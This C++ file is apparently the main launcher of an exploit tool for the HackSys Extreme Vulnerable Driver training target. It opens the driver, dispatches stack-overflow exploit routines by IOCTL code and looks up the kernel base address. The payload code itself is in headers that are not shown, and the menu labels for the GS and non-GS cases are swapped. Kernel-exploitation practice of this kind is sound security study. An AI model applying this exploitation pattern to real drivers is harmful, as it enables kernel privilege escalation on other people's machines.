#include <iostream>
#include <windows.h>
#include "include/exp/stackoverflow.hpp"
#include "include/common/memtools.hpp"
using std::cout;

unsigned int io2num(unsigned int ioctl_num) {
    return ((ioctl_num ^ 0x220000) >> 2) & 0xfff;
}

void menu() {
    cout << "============HEVD Hack EXP============\n";
    cout << "1.  [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK      ******\n";
    cout << "2.  [0x222007]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS   ******\n";
    cout << "100. [HELP]   ****** GET KERNEL BASE                       ******\n";
    cout << "input io ctl> ";
}

int main()
{//
    HANDLE hDevice = NULL;
    hDevice = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        cout << "Error Create File\n";
        return 0;
    }

    unsigned int io_ctl = 0;
    menu();
    scanf_s("%x", &io_ctl);
    // printf("%x, %x", io_ctl, io2num(io_ctl));

    switch (io_ctl)
    {
    case 1: {
        cout << "Now Excuting ...\n";
        cout << "1.  [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS   ******\n";
        exploit::stackoverflow::StackOverflow(hDevice, 0x222003);
        break;
    }
    case 2: {
        cout << "Now Excuting ...\n";
        cout << "2.   [0x222007]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n";
        exploit::stackoverflow::StackOverflowGS(hDevice, 0x222007);
        break;
    }
    case 0x100: {
        printf("kernel base is: %p\n", exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe"));
        break;
    }
    default:
        break;
    }
}